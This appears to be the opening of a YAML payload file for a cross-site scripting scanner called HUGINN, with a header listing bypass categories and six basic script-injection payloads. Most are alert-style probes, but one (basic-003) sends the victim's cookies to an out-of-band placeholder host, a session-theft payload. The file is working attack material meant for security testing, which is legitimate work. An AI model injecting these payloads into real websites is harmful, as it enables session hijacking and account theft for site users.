# =============================================================================
#  HUGINN :: payloads/xss.yaml
#  Comprehensive Cross-Site Scripting Arsenal — 2026 Edition
# -----------------------------------------------------------------------------
#  Categories:
#    - basic             : classic script tag injection
#    - event_handlers    : inline event handlers (onerror, onload, onfocus, ...)
#    - html5_tags        : modern HTML5 elements (video, details, marquee, ...)
#    - svg_vectors       : SVG-specific vectors (animate, set, foreignObject, ...)
#    - mathml_vectors    : MathML namespace confusion vectors
#    - polyglots         : multi-context payloads
#    - filter_bypass     : case, nested, slash, comments, whitespace
#    - encoding          : URL, HTML entity, unicode, hex, base64, octal
#    - context_breaks    : attribute, JS string, template literal, JSON
#    - waf_bypass        : WAF evasive syntax and obfuscation
#    - csp_bypass        : CSP misconfiguration exploitation (incl. nonce leakage)
#    - mxss              : mutation XSS / sanitizer bypass (incl. 2026 CVEs)
#    - dom_based         : DOM sinks, sources, postMessage, clobbering
#    - framework_specific: AngularJS, React, Vue, jQuery, Svelte
#    - csti              : client-side template injection
#    - prototype_pollution: PP-to-XSS gadget chains
#    - file_upload       : SVG, EXIF, polyglot image payloads
#    - header_injection  : XSS via Referer, User-Agent, X-Forwarded-For
#    - namespace_confusion: XML/SVG/MathML integration-point abuse
#    - modern            : WASM, service worker, import maps, Trusted Types,
#                          AI/LLM, postMessage, GraphQL, SSE, console
#    - legacy            : old browser quirks (IE, Netscape)
#    - blind             : blind XSS with tokenized OOB callbacks
# =============================================================================

meta:
  name: "HUGINN XSS Arsenal"
  version: "3.0.0"
  description: >
    Comprehensive XSS payload set spanning classic script injection through
    2025/2026 techniques including mutation XSS (mXSS), CSP bypass via JSONP
    and nonce leakage, SVG/MathML namespace confusion, DOM clobbering,
    prototype pollution chains, CSTI, file-upload XSS, WebAssembly obfuscation,
    service worker persistence, Trusted Types bypass, and AI/LLM-adjacent
    vectors. Every payload carries metadata for context-aware routing.
  attacker_placeholder: "{{ATTACKER}}"
  target_placeholder: "{{TARGET}}"
  alert_placeholder: "{{ALERT}}"
  oob_placeholder: "{{OOB}}"
  oob_host_placeholder: "{{OOB_HOST}}"
  oob_ws_placeholder: "{{OOB_WS}}"
  references:
    - "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
    - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection"
    - "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
    - "https://github.com/ardakocadoru/xss-cheatsheet"
    - "https://github.com/payload-box/xss-payload-list"
    - "https://github.com/Karthikdude/Advanced-XSS"
    - "https://www.vulnsy.com/cheat-sheets/xss"
    - "https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/"
  last_updated: "2026-09-11"

payloads:

  # ===========================================================================
  #  1. BASIC
  #     The classic. If any of these fire, the app has no XSS protection
  #     whatsoever. Report as high confidence immediately.
  # ===========================================================================
  - id: "basic-001"
    name: "Classic script alert"
    category: "basic"
    context: "html_body"
    payload: "<script>{{ALERT}}</script>"
    description: "Standard script tag injection — the canonical XSS test."
    tags: ["basic", "script_tag"]
    browsers: ["chrome", "firefox", "safari", "edge"]
    interaction: false
    detection: "alert fires on page load"

  - id: "basic-002"
    name: "Script with document.domain"
    category: "basic"
    context: "html_body"
    payload: "<script>alert(document.domain)</script>"
    description: "Confirms the exact origin executing the payload."
    tags: ["basic", "script_tag", "domain_proof"]
    browsers: ["all"]
    interaction: false
    detection: "alert shows target domain"

  - id: "basic-003"
    name: "Script with cookie exfiltration via OOB"
    category: "basic"
    context: "html_body"
    payload: "<script>fetch('{{OOB}}?c='+encodeURIComponent(document.cookie))</script>"
    description: "Exfiltrates cookies to the OOB receiver — confirms session theft impact."
    tags: ["basic", "exfiltration", "impact", "oob"]
    browsers: ["all"]
    interaction: false
    detection: "Token appears in oob.log after page render"

  - id: "basic-004"
    name: "Script with confirm"
    category: "basic"
    context: "html_body"
    payload: "<script>confirm(1)</script>"
    description: "Alternative to alert() — some WAFs block 'alert' specifically."
    tags: ["basic", "script_tag", "waf_alternative"]
    browsers: ["all"]
    interaction: false

  - id: "basic-005"
    name: "Script with prompt"
    category: "basic"
    context: "html_body"
    payload: "<script>prompt(1)</script>"
    description: "Alternative to alert() and confirm()."
    tags: ["basic", "script_tag", "waf_alternative"]
    browsers: ["all"]
    interaction: false

  - id: "basic-006"
    name: "Script with print"
    category: "basic"
    context: "html_body"
    payload: "<script>print()</script>"
    description: "Print dialog — used by PortSwigger labs as alert() alternative."
    tags: ["basic", "script_tag", "waf_alternative"]
    browsers: ["all"]
